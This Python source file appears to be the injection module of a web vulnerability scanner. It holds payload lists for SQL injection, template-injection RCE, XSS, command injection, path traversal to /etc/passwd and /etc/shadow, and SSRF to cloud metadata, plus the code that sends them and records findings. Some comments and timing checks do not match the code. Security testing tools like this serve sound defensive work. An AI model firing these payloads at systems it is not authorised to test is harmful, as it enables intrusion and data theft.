"""
ShadowScan - Injection Module
Tests for injection vulnerabilities across discovered endpoints and parameters.
Covers: SQLi (error-based, blind), SSTI, XSS (reflected), Open Redirect,
        Command Injection, Path Traversal, SSRF.
"""

import re
import time
from typing import List, Dict, Tuple, Optional
from urllib.parse import urljoin, urlparse, urlencode, parse_qs, urlunparse
from core.scanner import Scanner, ScanResponse
from core.context import ScanContext, Finding, FindingType, Severity


# ─── SQLi Payloads ────────────────────────────────────────────────────────────

SQLI_ERROR_PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1'--",
    "' OR 1=1--",
    "\" OR \"1\"=\"1",
    "1' AND SLEEP(0)--",
    "1 AND 1=CONVERT(int,@@version)--",
    "'; SELECT 1--",
    "') OR ('1'='1",
]

SQLI_ERROR_SIGNATURES = [
    # MySQL
    (r"you have an error in your sql syntax", "MySQL syntax error", Severity.HIGH),
    (r"warning: mysql", "MySQL warning", Severity.HIGH),
    (r"mysql_fetch", "MySQL function exposed", Severity.HIGH),
    (r"mysql_num_rows", "MySQL function exposed", Severity.HIGH),
    # MSSQL
    (r"microsoft ole db provider for sql server", "MSSQL OLE DB error", Severity.HIGH),
    (r"odbc microsoft access driver", "ODBC error", Severity.MEDIUM),
    (r"syntax error converting", "MSSQL conversion error", Severity.HIGH),
    (r"unclosed quotation mark", "MSSQL unclosed quote", Severity.HIGH),
    # Oracle
    (r"ora-\d{5}", "Oracle DB error", Severity.HIGH),
    (r"oracle error", "Oracle error", Severity.HIGH),
    # PostgreSQL
    (r"pg_query\(\):", "PostgreSQL error", Severity.HIGH),
    (r"postgresql.*error", "PostgreSQL error", Severity.HIGH),
    (r"unterminated quoted string at or near", "PostgreSQL syntax error", Severity.HIGH),
    # SQLite
    (r"sqlite3?\.operationalerror", "SQLite error", Severity.HIGH),
    (r"sqlite_master", "SQLite table exposed", Severity.HIGH),
    # Generic
    (r"sql syntax.*mysql", "Generic SQL error", Severity.MEDIUM),
    (r"native client.*error", "SQL native client error", Severity.MEDIUM),
]

SQLI_BLIND_PAYLOADS = [
    # Time-based (MySQL)
    ("1 AND SLEEP(4)--", "mysql_sleep"),
    ("1; WAITFOR DELAY '0:0:4'--", "mssql_wait"),
    ("1 AND pg_sleep(4)--", "pg_sleep"),
    ("1 OR SLEEP(4)=0 LIMIT 1--", "mysql_sleep_or"),
]


# ─── SSTI Payloads ────────────────────────────────────────────────────────────

SSTI_PAYLOADS = [
    # Detection (math expressions engines evaluate)
    ("{{7*7}}", "49"),
    ("${7*7}", "49"),
    ("<%= 7*7 %>", "49"),
    ("#{7*7}", "49"),
    ("*{7*7}", "49"),
    ("{{7*'7'}}", "7777777"),         # Jinja2 specific
    ("${{7*7}}", "49"),
    ("{%- set a = 7*7 -%}{{a}}", "49"),
]

SSTI_RCE_PAYLOADS = [
    # Jinja2 RCE (safe test — reads /etc/hostname)
    "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
    "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0]}}",
    # Twig RCE
    "{{['id']|filter('system')}}",
    # Freemarker RCE
    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
]


# ─── XSS Payloads ─────────────────────────────────────────────────────────────

XSS_PAYLOADS = [
    '<script>alert("SHADOWXSS")</script>',
    '"><script>alert("SHADOWXSS")</script>',
    "';alert('SHADOWXSS')//",
    "<img src=x onerror=alert('SHADOWXSS')>",
    "<svg onload=alert('SHADOWXSS')>",
    "javascript:alert('SHADOWXSS')",
    '"><img src=x onerror=alert(1)>',
    "<body onload=alert('SHADOWXSS')>",
    "'-alert('SHADOWXSS')-'",
    "<iframe src=javascript:alert('SHADOWXSS')>",
]

XSS_MARKER = "SHADOWXSS"


# ─── Open Redirect Payloads ───────────────────────────────────────────────────

REDIRECT_PAYLOADS = [
    "https://evil.shadowscan.io",
    "//evil.shadowscan.io",
    "/\\evil.shadowscan.io",
    "https:///evil.shadowscan.io",
    "https://evil.shadowscan.io%2F",
    "%2Fevil.shadowscan.io",
    "/%09/evil.shadowscan.io",
]

REDIRECT_PARAMS = ["redirect", "url", "next", "return", "returnUrl", "return_url",
                   "redirect_uri", "redirectUri", "goto", "dest", "destination",
                   "redir", "r", "u", "link", "target", "to", "forward"]


# ─── Command Injection Payloads ───────────────────────────────────────────────

CMDI_PAYLOADS = [
    (";id", "uid="),
    ("&&id", "uid="),
    ("|id", "uid="),
    ("||id", "uid="),
    ("`id`", "uid="),
    ("$(id)", "uid="),
    (";sleep 3", None),   # blind via timing
    ("&&sleep 3", None),
    ("|sleep 3", None),
]


# ─── Path Traversal Payloads ──────────────────────────────────────────────────

TRAVERSAL_PAYLOADS = [
    "../../../etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "/etc/passwd",
    "../../../../etc/shadow",
    "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
]

TRAVERSAL_SIGNATURES = ["root:x:", "root:0:0", "[boot loader]", "[extensions]"]

# ─── SSRF Payloads ────────────────────────────────────────────────────────────

SSRF_PARAMS = ["url", "uri", "path", "src", "href", "dest", "redirect",
               "proxy", "fetch", "load", "request", "host", "endpoint"]

SSRF_PAYLOADS = [
    "http://169.254.169.254/latest/meta-data/",      # AWS metadata
    "http://metadata.google.internal/",               # GCP
    "http://169.254.169.254/metadata/v1/",            # Azure
    "http://127.0.0.1:80",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
]

SSRF_SIGNATURES = [
    "ami-id", "instance-id", "local-ipv4",  # AWS
    "computeMetadata",                        # GCP
    "compute/",                              # Azure
]


class InjectionModule:
    """
    Tests injection vulnerabilities across all discovered endpoints and parameters.
    Checks SQLi, SSTI, XSS, Open Redirect, Command Injection, Path Traversal, SSRF.
    """

    def __init__(self, scanner: Scanner, ctx: ScanContext):
        self.scanner = scanner
        self.ctx = ctx
        self._tested_params: set = set()

    def run(self) -> List[Finding]:
        findings = []

        # Collect testable endpoints + parameters
        targets = self._collect_injectable_targets()

        if not targets:
            self.ctx.mark_complete("injection")
            return findings

        findings += self._test_sqli(targets)
        findings += self._test_ssti(targets)
        findings += self._test_xss(targets)
        findings += self._test_open_redirect()
        findings += self._test_path_traversal(targets)
        findings += self._test_ssrf(targets)
        findings += self._test_cmdi(targets)

        self.ctx.mark_complete("injection")
        return findings

    # ─── Target Collection ────────────────────────────────────────────────────

    def _collect_injectable_targets(self) -> List[Dict]:
        """
        Returns list of {url, param, method} dicts ready to inject into.
        Sources: URL query params from discovered endpoints + form inputs.
        """
        targets = []
        seen = set()

        for endpoint in self.ctx.endpoints:
            parsed = urlparse(endpoint)
            params = parse_qs(parsed.query)

            for param in params:
                key = f"{parsed.scheme}://{parsed.netloc}{parsed.path}|{param}"
                if key not in seen:
                    seen.add(key)
                    targets.append({
                        "url": endpoint,
                        "base_url": f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
                        "param": param,
                        "original_value": params[param][0],
                        "all_params": {k: v[0] for k, v in params.items()},
                        "method": "GET",
                    })

        # Also generate common param targets on the base domain
        base = self.scanner.get_base_domain()
        common_endpoints = [
            f"{base}/search", f"{base}/api/search",
            f"{base}/api/v1/search", f"{base}/api/users",
            f"{base}/api/v1/users", f"{base}/api/products",
        ]
        common_params = ["q", "id", "search", "query", "user_id", "page", "sort", "filter", "name"]

        for ep in common_endpoints:
            for param in common_params:
                key = f"{ep}|{param}"
                if key not in seen:
                    seen.add(key)
                    targets.append({
                        "url": f"{ep}?{param}=test",
                        "base_url": ep,
                        "param": param,
                        "original_value": "test",
                        "all_params": {param: "test"},
                        "method": "GET",
                    })

        return targets[:50]  # Cap to avoid runaway

    def _build_injected_url(self, target: Dict, payload: str) -> str:
        """Replace the target param value with the payload."""
        params = dict(target["all_params"])
        params[target["param"]] = payload
        return f"{target['base_url']}?{urlencode(params)}"

    # ─── SQLi ─────────────────────────────────────────────────────────────────

    def _test_sqli(self, targets: List[Dict]) -> List[Finding]:
        findings = []

        for target in targets:
            # Error-based
            for payload in SQLI_ERROR_PAYLOADS:
                url = self._build_injected_url(target, payload)
                resp = self.scanner.get(url)
                if not resp:
                    continue

                for pattern, error_type, severity in SQLI_ERROR_SIGNATURES:
                    if re.search(pattern, resp.body, re.IGNORECASE):
                        f = Finding(
                            type=FindingType.SQLI,
                            severity=severity,
                            title=f"SQL Injection — {error_type}",
                            url=url,
                            description=f"Error-based SQLi in parameter `{target['param']}`. Database error triggered: {error_type}.",
                            evidence=f"Payload: {payload}\nError pattern: {error_type}\nResponse snippet:\n{resp.body[:400]}",
                            module="injection",
                            metadata={
                                "param": target["param"],
                                "payload": payload,
                                "error_type": error_type,
                                "technique": "error-based",
                            },
                        )
                        findings.append(f)
                        self.ctx.add_finding(f)
                        self.ctx.set_flag("has_sqli_candidate", True)
                        break  # One finding per param

            # Time-based blind SQLi
            for payload, technique in SQLI_BLIND_PAYLOADS:
                url = self._build_injected_url(target, payload)
                start = time.time()
                resp = self.scanner.get(url)
                elapsed = time.time() - start

                if resp and elapsed >= 3.5:
                    # Verify with a control (no delay payload)
                    control_url = self._build_injected_url(target, "1")
                    control_start = time.time()
                    control_resp = self.scanner.get(control_url)
                    control_elapsed = time.time() - control_start

                    if elapsed - control_elapsed >= 3.0:
                        f = Finding(
                            type=FindingType.SQLI,
                            severity=Severity.CRITICAL,
                            title=f"SQL Injection — Time-Based Blind ({technique})",
                            url=url,
                            description=f"Time-based blind SQLi in parameter `{target['param']}`. Response delayed {elapsed:.1f}s vs control {control_elapsed:.1f}s.",
                            evidence=f"Payload: {payload}\nDelay: {elapsed:.2f}s | Control: {control_elapsed:.2f}s",
                            module="injection",
                            metadata={
                                "param": target["param"],
                                "payload": payload,
                                "technique": technique,
                                "delay": round(elapsed, 2),
                                "control_delay": round(control_elapsed, 2),
                            },
                        )
                        findings.append(f)
                        self.ctx.add_finding(f)
                        self.ctx.set_flag("has_sqli_candidate", True)

        return findings

    # ─── SSTI ─────────────────────────────────────────────────────────────────

    def _test_ssti(self, targets: List[Dict]) -> List[Finding]:
        findings = []

        for target in targets:
            for payload, expected in SSTI_PAYLOADS:
                url = self._build_injected_url(target, payload)
                resp = self.scanner.get(url)
                if not resp:
                    continue

                if expected and expected in resp.body:
                    f = Finding(
                        type=FindingType.SSTI,
                        severity=Severity.CRITICAL,
                        title=f"Server-Side Template Injection (SSTI)",
                        url=url,
                        description=(
                            f"SSTI confirmed in parameter `{target['param']}`. "
                            f"Payload `{payload}` was evaluated server-side, returning `{expected}`. "
                            "This typically leads to Remote Code Execution."
                        ),
                        evidence=f"Payload: {payload}\nExpected output: {expected}\nResponse snippet:\n{resp.body[:400]}",
                        module="injection",
                        metadata={
                            "param": target["param"],
                            "payload": payload,
                            "expected": expected,
                        },
                    )
                    findings.append(f)
                    self.ctx.add_finding(f)
                    break  # Confirmed SSTI on this param, no need to continue

        return findings

    # ─── XSS ──────────────────────────────────────────────────────────────────

    def _test_xss(self, targets: List[Dict]) -> List[Finding]:
        findings = []

        for target in targets:
            for payload in XSS_PAYLOADS:
                url = self._build_injected_url(target, payload)
                resp = self.scanner.get(url)
                if not resp:
                    continue

                # Check if payload is reflected unencoded
                if XSS_MARKER in resp.body and payload in resp.body:
                    # Make sure it's not HTML-encoded
                    encoded = payload.replace("<", "&lt;").replace(">", "&gt;")
                    if encoded not in resp.body:
                        csp = resp.get_header("Content-Security-Policy")
                        severity = Severity.MEDIUM if csp else Severity.HIGH

                        f = Finding(
                            type=FindingType.XSS,
                            severity=severity,
                            title=f"Reflected XSS in parameter `{target['param']}`",
                            url=url,
                            description=(
                                f"XSS payload reflected unencoded in response. "
                                + (f"CSP present but verify bypass: {csp}" if csp else "No Content-Security-Policy header.")
                            ),
                            evidence=f"Payload: {payload}\nReflected in response:\n{resp.body[:400]}",
                            module="injection",
                            metadata={
                                "param": target["param"],
                                "payload": payload,
                                "csp": csp,
                            },
                        )
                        findings.append(f)
                        self.ctx.add_finding(f)
                        break

        return findings

    # ─── Open Redirect ────────────────────────────────────────────────────────

    def _test_open_redirect(self) -> List[Finding]:
        findings = []
        base = self.scanner.get_base_domain()

        for param in REDIRECT_PARAMS:
            for payload in REDIRECT_PAYLOADS[:4]:  # Test top 4 per param
                url = f"{base}?{param}={payload}"
                resp = self.scanner.get(url)
                if not resp:
                    continue

                # Check if redirected to our payload domain
                if resp.history:
                    final_url = resp.url
                    if "evil.shadowscan.io" in final_url or "evil" in final_url:
                        f = Finding(
                            type=FindingType.OPEN_REDIRECT,
                            severity=Severity.MEDIUM,
                            title=f"Open Redirect via `{param}` parameter",
                            url=url,
                            description=f"Server redirected to attacker-controlled URL via `{param}` parameter. Can be used for phishing and OAuth token theft.",
                            evidence=f"Payload: {payload}\nRedirect chain: {[r.url for r in resp.history]} → {resp.url}",
                            module="injection",
                            metadata={"param": param, "payload": payload},
                        )
                        findings.append(f)
                        self.ctx.add_finding(f)
                        break

                # Also check for redirect URL in response body
                if payload in resp.body and resp.status_code in (301, 302, 303, 307, 308):
                    location = resp.get_header("Location") or ""
                    if "evil" in location:
                        f = Finding(
                            type=FindingType.OPEN_REDIRECT,
                            severity=Severity.MEDIUM,
                            title=f"Open Redirect (header) via `{param}`",
                            url=url,
                            description=f"Location header reflects attacker payload via `{param}`.",
                            evidence=f"Payload: {payload}\nLocation: {location}",
                            module="injection",
                            metadata={"param": param, "payload": payload},
                        )
                        findings.append(f)
                        self.ctx.add_finding(f)

        return findings

    # ─── Path Traversal ───────────────────────────────────────────────────────

    def _test_path_traversal(self, targets: List[Dict]) -> List[Finding]:
        findings = []

        # Filter for file-like params
        file_params = [
            t for t in targets
            if any(k in t["param"].lower() for k in
                   ["file", "path", "page", "template", "view", "load", "include", "doc", "name", "filename"])
        ]

        # Also test common file-serving endpoints
        base = self.scanner.get_base_domain()
        extra_targets = []
        for path in ["/download", "/api/file", "/api/v1/file", "/static", "/files", "/view"]:
            for param in ["file", "path", "name", "filename", "doc"]:
                extra_targets.append({
                    "base_url": urljoin(base, path),
                    "param": param,
                    "all_params": {param: "test.txt"},
                    "method": "GET",
                })

        for target in (file_params + extra_targets)[:20]:
            for payload in TRAVERSAL_PAYLOADS:
                url = self._build_injected_url(target, payload)
                resp = self.scanner.get(url)
                if not resp or resp.status_code not in (200,):
                    continue

                for sig in TRAVERSAL_SIGNATURES:
                    if sig in resp.body:
                        f = Finding(
                            type=FindingType.LFI,
                            severity=Severity.CRITICAL,
                            title=f"Path Traversal / LFI — `/etc/passwd` readable",
                            url=url,
                            description=f"Local file inclusion confirmed. `/etc/passwd` content returned via parameter `{target['param']}`.",
                            evidence=f"Payload: {payload}\nSignature matched: {sig}\nContent:\n{resp.body[:400]}",
                            module="injection",
                            metadata={"param": target["param"], "payload": payload, "signature": sig},
                        )
                        findings.append(f)
                        self.ctx.add_finding(f)
                        break

        return findings

    # ─── SSRF ─────────────────────────────────────────────────────────────────

    def _test_ssrf(self, targets: List[Dict]) -> List[Finding]:
        findings = []

        ssrf_targets = [
            t for t in targets
            if any(k in t["param"].lower() for k in SSRF_PARAMS)
        ]

        for target in ssrf_targets[:15]:
            for payload in SSRF_PAYLOADS[:4]:
                url = self._build_injected_url(target, payload)
                resp = self.scanner.get(url)
                if not resp or resp.status_code not in (200,):
                    continue

                for sig in SSRF_SIGNATURES:
                    if sig in resp.body:
                        f = Finding(
                            type=FindingType.SSRF,
                            severity=Severity.CRITICAL,
                            title=f"SSRF — Cloud metadata accessible",
                            url=url,
                            description=f"Server-Side Request Forgery confirmed. Cloud metadata endpoint reachable via `{target['param']}`. Credentials and instance data may be exposed.",
                            evidence=f"Payload: {payload}\nMetadata signature: {sig}\nResponse:\n{resp.body[:400]}",
                            module="injection",
                            metadata={"param": target["param"], "payload": payload, "ssrf_target": payload},
                        )
                        findings.append(f)
                        self.ctx.add_finding(f)
                        break

        return findings

    # ─── Command Injection ────────────────────────────────────────────────────

    def _test_cmdi(self, targets: List[Dict]) -> List[Finding]:
        findings = []

        # Only test params that look like they could reach shell
        shell_params = [
            t for t in targets
            if any(k in t["param"].lower() for k in
                   ["cmd", "command", "exec", "run", "shell", "ping", "host", "ip", "domain",
                    "lookup", "query", "nslookup", "dig", "traceroute"])
        ]

        for target in shell_params[:10]:
            for payload, expected_output in CMDI_PAYLOADS:
                url = self._build_injected_url(target, "127.0.0.1" + payload)
                start = time.time()
                resp = self.scanner.get(url)
                elapsed = time.time() - start

                if not resp:
                    continue

                if expected_output and expected_output in resp.body:
                    f = Finding(
                        type=FindingType.CMDI,
                        severity=Severity.CRITICAL,
                        title=f"Command Injection in `{target['param']}`",
                        url=url,
                        description=f"OS command injection confirmed. `id` command output found in response via `{target['param']}` parameter.",
                        evidence=f"Payload: {payload}\nOutput found: {expected_output}\nResponse:\n{resp.body[:400]}",
                        module="injection",
                        metadata={"param": target["param"], "payload": payload},
                    )
                    findings.append(f)
                    self.ctx.add_finding(f)

                elif expected_output is None and elapsed >= 2.8:
                    # Blind timing-based
                    control_resp = self.scanner.get(self._build_injected_url(target, "127.0.0.1"))
                    control_time = time.time() - start - elapsed

                    if elapsed - abs(control_time) >= 2.5:
                        f = Finding(
                            type=FindingType.CMDI,
                            severity=Severity.CRITICAL,
                            title=f"Blind Command Injection (time-based) in `{target['param']}`",
                            url=url,
                            description=f"Blind OS command injection via sleep payload. Response delayed ~3s.",
                            evidence=f"Payload: {payload}\nDelay: {elapsed:.2f}s",
                            module="injection",
                            metadata={"param": target["param"], "payload": payload, "delay": round(elapsed, 2)},
                        )
                        findings.append(f)
                        self.ctx.add_finding(f)

        return findings
